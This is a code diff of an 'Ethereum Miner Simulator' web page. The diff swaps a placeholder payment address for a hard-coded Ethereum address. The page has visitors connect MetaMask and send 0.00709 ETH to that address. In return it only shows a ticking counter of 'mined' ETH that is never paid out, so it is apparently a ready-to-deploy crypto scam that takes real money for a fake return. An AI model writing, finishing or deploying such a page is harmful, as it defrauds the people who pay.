@@ -1,102 +1,110 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Ethereum Miner Simulator</title>
-  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
+  <!-- Ethers.js for wallet interaction -->
+  <script src="https://cdn.jsdelivr.net/npm/ethers/dist/ethers.min.js"></script>
   <style>
-    body {
-      background: #111;
-      color: #eee;
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding: 40px;
-    }
-    button {
-      padding: 12px 25px;
-      font-size: 16px;
-      margin-top: 20px;
-      background: #4CAF50;
-      color: white;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-    }
-    #balance {
-      margin-top: 20px;
-      font-size: 20px;
-      color: #0f0;
-    }
+    body { font-family: Arial, sans-serif; background: #121212; color: #eee; text-align: center; padding: 2rem; }
+    button { padding: 0.75rem 1.5rem; margin: 0.5rem; font-size: 1rem; cursor: pointer; }
+    #status { margin-top: 1rem; }
   </style>
 </head>
 <body>
   <h1>Ethereum Miner Simulator</h1>
-  <button onclick="connectWallet()">Connect Wallet</button>
-  <div id="walletAddress"></div>
-  <button onclick="startMining()" id="mineBtn" disabled>Start Mine</button>
+  <div id="account">Wallet: <em>Not connected</em></div>
+  <button id="btnConnect">Connect Wallet</button>
+  <button id="btnPayMine" disabled>Pay 0.00709 ETH &amp; Start Mining</button>
   <div id="status"></div>
-  <div id="balance">Balance: 0 ETH</div>
+  <div>Mined so far: <span id="minedAmount">0.000000000</span> ETH</div>
 
   <script>
-    let provider;
-    let signer;
-    let userAddress;
-    let miningInterval;
-    let mining = false;
-    let minedETH = 0;
-    const miningRate = 0.00000000382;
-    const maxETH = 0.0099;
-    const miningFee = "0.00709";
+    // --- Configuration ---
+    const PAYMENT_ADDRESS = "0xf1b3424bb282ee20e394717dcb4fe59fc67835e0";
+    const PAYMENT_AMOUNT = "0.00709";          // ETH to pay
+    const MINE_RATE = 0.00000000382;           // ETH per second
+    const MINE_CAP = 0.0099;                   // ETH cap before stop
 
-    async function connectWallet() {
-      if (typeof window.ethereum !== 'undefined') {
+    // --- State ---
+    let provider, signer, userAddress;
+    let mined = 0;
+    let miningInterval = null;
+
+    // --- UI Elements ---
+    const btnConnect   = document.getElementById("btnConnect");
+    const btnPayMine   = document.getElementById("btnPayMine");
+    const accountDiv   = document.getElementById("account");
+    const statusDiv    = document.getElementById("status");
+    const minedDisplay = document.getElementById("minedAmount");
+
+    // --- Helpers ---
+    function updateMinedDisplay() {
+      minedDisplay.textContent = mined.toFixed(9);
+    }
+    function setStatus(msg) {
+      statusDiv.textContent = msg;
+    }
+
+    // --- Connect Wallet ---
+    btnConnect.onclick = async () => {
+      if (!window.ethereum) {
+        alert("Please install MetaMask to use this app.");
+        return;
+      }
+      try {
         provider = new ethers.providers.Web3Provider(window.ethereum);
         await provider.send("eth_requestAccounts", []);
         signer = provider.getSigner();
         userAddress = await signer.getAddress();
-        document.getElementById("walletAddress").innerText = `Connected: ${userAddress}`;
-        document.getElementById("mineBtn").disabled = false;
-      } else {
-        alert("MetaMask is not installed.");
-      }
-    }
-
-    async function startMining() {
-      if (mining) {
-        alert("Mining already in progress.");
-        return;
-      }
-
-      const tx = {
-        to: "0xYourWalletAddressHere", // Replace with your ETH address
-        value: ethers.utils.parseEther(miningFee)
-      };
-
-      try {
-        const response = await signer.sendTransaction(tx);
-        document.getElementById("status").innerText = "Waiting for payment confirmation...";
-        await response.wait();
-        document.getElementById("status").innerText = "Payment confirmed! Mining started.";
-        startMiningSimulation();
+        accountDiv.innerHTML = `Wallet: <strong>${userAddress}</strong>`;
+        btnPayMine.disabled = false;
+        setStatus("Wallet connected. Ready to pay & start mining.");
       } catch (err) {
         console.error(err);
-        document.getElementById("status").innerText = "Payment failed or cancelled.";
+        setStatus("Connection failed.");
       }
-    }
+    };
 
-    function startMiningSimulation() {
-      mining = true;
+    // --- Trigger Payment & Start Mining ---
+    btnPayMine.onclick = async () => {
+      btnPayMine.disabled = true;
+      setStatus("Requesting payment transaction...");
+      try {
+        // Send payment
+        const tx = await signer.sendTransaction({
+          to: PAYMENT_ADDRESS,
+          value: ethers.utils.parseEther(PAYMENT_AMOUNT)
+        });
+        setStatus("Awaiting confirmation...");
+        await tx.wait(); 
+        setStatus("Payment confirmed! Mining started.");
+        startMining();
+      } catch (err) {
+        console.error(err);
+        setStatus("Payment failed or rejected.");
+        btnPayMine.disabled = false;
+      }
+    };
+
+    // --- Mining Simulation ---
+    function startMining() {
+      mined = 0;
+      updateMinedDisplay();
+      // Tick every second
       miningInterval = setInterval(() => {
-        if (minedETH >= maxETH) {
+        mined += MINE_RATE;
+        if (mined >= MINE_CAP) {
+          mined = MINE_CAP;
+          updateMinedDisplay();
           clearInterval(miningInterval);
-          mining = false;
-          document.getElementById("status").innerText = "Mining complete. Please pay to start again.";
-          return;
+          setStatus(`Reached ${MINE_CAP} ETH. Please pay again to continue.`);
+          btnPayMine.disabled = false;
+        } else {
+          updateMinedDisplay();
         }
-
-        minedETH += miningRate;
-        document.getElementById("balance").innerText = `Balance: ${minedETH.toFixed(9)} ETH`;
-      }, 1000); // every second
+      }, 1000);
     }
   </script>
 </body>
